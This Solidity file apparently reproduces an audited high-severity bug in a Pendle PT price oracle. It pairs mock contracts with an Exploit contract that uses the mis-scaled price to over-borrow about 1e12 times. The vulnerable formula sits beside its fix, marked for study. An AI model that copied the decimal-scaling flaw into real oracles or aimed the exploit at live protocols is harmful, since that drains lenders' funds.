// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Notional Leveraged Vaults — PendlePTOracle prices a 6-decimal PT with the
    wrong scale (Sherlock 2024-06, finding 35122, H-9).
    SYNTHETIC, cheatcode-free. The decimal conversion and the answer formula
    are the audited lines. Root cause: getPtToAssetRate is 18 decimals, but
    the formula divides by ptDecimals (10**pt token decimals). For PT-fUSDC
    that divisor is 1e6, so the 18-decimal USD price is inflated by ~1e12 and
    a 1 PT deposit can borrow ~1e12 times its fair USDC value. */

library TypeConvert {
    function toInt(uint256 x) internal pure returns (int256) {
        return int256(x);
    }
}

interface IBaseToUSD {
    function decimals() external view returns (uint8);
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

interface IPendleMarket {
    function readTokens() external view returns (address sy, address pt, address yt);
    function expiry() external view returns (uint256);
}

interface IERC20Decimals {
    function decimals() external view returns (uint8);
}

interface IPendleOracle {
    function getOracleState(address market, uint32 duration) external view returns (bool, uint16, bool);
    function getPtToSyRate(address market, uint32 duration) external view returns (uint256);
    function getPtToAssetRate(address market, uint32 duration) external view returns (uint256);
}

contract MiniToken is IERC20Decimals {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Chainlink fUSDC/USD. The report's round is 99990557 at 8 decimals (~$0.9999).
contract BaseUsdFeed is IBaseToUSD {
    function decimals() external pure returns (uint8) {
        return 8;
    }

    function latestRoundData() external pure returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 99990557, 0, 1, 1);
    }
}

contract PendleMarket is IPendleMarket {
    address public pt;

    constructor(address pt_) {
        pt = pt_;
    }

    function readTokens() external view returns (address sy, address pt_, address yt) {
        return (address(0), pt, address(0));
    }

    function expiry() external pure returns (uint256) {
        return type(uint256).max;
    }
}

/// Pendle PT oracle. getPtToAssetRate is always 18 decimals, not PT decimals.
contract PendleRateOracle is IPendleOracle {
    function getOracleState(address, uint32) external pure returns (bool, uint16, bool) {
        return (false, 0, true);
    }

    function getPtToSyRate(address, uint32) external pure returns (uint256) {
        return 978197897539187120;
    }

    function getPtToAssetRate(address, uint32) external pure returns (uint256) {
        return 978197897539187120;
    }
}

contract PendlePTOracle {
    using TypeConvert for uint256;

    address public immutable pendleMarket;
    uint32 public constant twapDuration = 1800;
    bool public immutable useSyOracleRate;

    uint8 public constant decimals = 18;
    int256 public constant rateDecimals = 10**18;

    IBaseToUSD public immutable baseToUSDOracle;
    int256 public immutable baseToUSDDecimals;
    int256 public immutable ptDecimals;
    bool public constant invertBase = false;
    address public constant sequencerUptimeOracle = address(0);
    IPendleOracle public immutable pendleOracle;
    uint256 public immutable expiry;

    constructor(
        IPendleMarket pendleMarket_,
        IBaseToUSD baseToUSDOracle_,
        IPendleOracle pendleOracle_,
        bool useSyOracleRate_
    ) {
        pendleMarket = address(pendleMarket_);
        baseToUSDOracle = baseToUSDOracle_;
        pendleOracle = pendleOracle_;
        useSyOracleRate = useSyOracleRate_;

        uint8 _baseDecimals = baseToUSDOracle_.decimals();
        (/* */, address pt, /* */) = pendleMarket_.readTokens();
        uint8 _ptDecimals = IERC20Decimals(pt).decimals();

        require(_baseDecimals <= 18);
        require(_ptDecimals <= 18);

        baseToUSDDecimals = int256(10**_baseDecimals);
        ptDecimals = int256(10**_ptDecimals);

        (bool increaseCardinalityRequired, , bool oldestObservationSatisfied) =
            pendleOracle_.getOracleState(pendleMarket, twapDuration);
        require(!increaseCardinalityRequired && oldestObservationSatisfied, "Oracle Init");

        expiry = pendleMarket_.expiry();
    }

    function _checkSequencer() private view {
        if (sequencerUptimeOracle != address(0)) {
            revert("Sequencer Down");
        }
    }

    function _getPTRate() internal view returns (int256) {
        uint256 ptRate = useSyOracleRate
            ? pendleOracle.getPtToSyRate(pendleMarket, twapDuration)
            : pendleOracle.getPtToAssetRate(pendleMarket, twapDuration);
        return ptRate.toInt();
    }

    function _calculateBaseToQuote()
        internal
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        _checkSequencer();

        int256 baseToUSD;
        (roundId, baseToUSD, startedAt, updatedAt, answeredInRound) = baseToUSDOracle.latestRoundData();
        require(baseToUSD > 0, "Chainlink Rate Error");
        // Overflow and div by zero not possible
        if (invertBase) baseToUSD = (baseToUSDDecimals * baseToUSDDecimals) / baseToUSD;

        // Past expiration, hardcode the PT oracle price to 1. It is no longer tradable and
        // is worth 1 unit of the underlying SY at expiration.
        int256 ptRate = expiry <= block.timestamp ? ptDecimals : _getPTRate();

        // @> VULN: ptRate is 18 decimals; dividing by ptDecimals (10**pt decimals) inflates the price.
        answer = (ptRate * baseToUSD * rateDecimals) / (baseToUSDDecimals * ptDecimals);
        // FIX: answer = (ptRate * baseToUSD * rateDecimals) / (baseToUSDDecimals * rateDecimals);
    }

    function latestAnswer() external view returns (int256 answer) {
        (, answer,,,) = _calculateBaseToQuote();
    }
}

/// Prices 1 whole PT with the oracle's 18-decimal USD answer and lends 6-decimal USDC.
contract LeveragedVault {
    PendlePTOracle public oracle;
    MiniToken public pt;
    MiniToken public usdc;
    uint256 public immutable ptScale;
    uint256 public constant USDC_SCALE = 10**12;
    mapping(address => uint256) public collateral;

    constructor(PendlePTOracle oracle_, MiniToken pt_, MiniToken usdc_) {
        oracle = oracle_;
        pt = pt_;
        usdc = usdc_;
        ptScale = 10 ** uint256(pt_.decimals());
    }

    function deposit(uint256 amount) external {
        pt.transferFrom(msg.sender, address(this), amount);
        collateral[msg.sender] += amount;
    }

    function quoteBorrow(int256 price, uint256 ptAmount) public view returns (uint256) {
        uint256 usd18 = ptAmount * uint256(price) / ptScale;
        return usd18 / USDC_SCALE;
    }

    function borrowLimit(address account) public view returns (uint256) {
        int256 price = oracle.latestAnswer();
        return quoteBorrow(price, collateral[account]);
    }

    function borrowMax() external {
        uint256 limit = borrowLimit(msg.sender);
        usdc.transfer(msg.sender, limit);
    }
}

contract Exploit {
    // Report inputs: ptRate 978197897539187120, baseToUSD 99990557, rateDecimals 1e18,
    // baseToUSDDecimals 1e8, ptDecimals 1e6. Exact integer answer, not the rounded 9.781055263e29.
    int256 public constant BUGGY_PRICE = 978105526311722494560258400000;
    int256 public constant FAIR_PRICE = 978105526311722494;
    uint256 public constant BUGGY_BORROW = 978105526311722494;
    uint256 public constant FAIR_BORROW = 978105;
    uint256 public constant ONE_PT = 1e6;
    uint256 public constant SEED = 1e24;

    BaseUsdFeed public feeds; // nonce 1
    MiniToken public pt; // nonce 2
    MiniToken public usdc; // nonce 3
    PendleMarket public market; // nonce 4
    PendleRateOracle public pendle; // nonce 5
    PendlePTOracle public oracle; // nonce 6
    LeveragedVault public vault; // nonce 7

    constructor() {
        feeds = new BaseUsdFeed();
        pt = new MiniToken("PT fUSDC 26DEC2024", "PT-fUSDC", 6);
        usdc = new MiniToken("USD Coin", "USDC", 6);
        market = new PendleMarket(address(pt));
        pendle = new PendleRateOracle();
        oracle = new PendlePTOracle(IPendleMarket(address(market)), feeds, pendle, false);
        vault = new LeveragedVault(oracle, pt, usdc);
        pt.mint(address(this), ONE_PT);
        usdc.mint(address(vault), SEED);
    }

    function run() external {
        pt.approve(address(vault), ONE_PT);
        vault.deposit(ONE_PT);
        int256 price = oracle.latestAnswer();
        uint256 limit = vault.borrowLimit(address(this));
        vault.borrowMax();
        uint256 borrowed = usdc.balanceOf(address(this));
        require(price == BUGGY_PRICE, "inflated price");
        require(uint256(price) / uint256(FAIR_PRICE) == 1e12, "not 1e12 inflated");
        require(limit == BUGGY_BORROW, "borrow limit");
        require(borrowed == limit, "over-borrow");
        require(borrowed > FAIR_BORROW * 1e12, "not far above fair");
        require(usdc.balanceOf(address(vault)) + borrowed == SEED, "proceeds left the vault");
    }
}
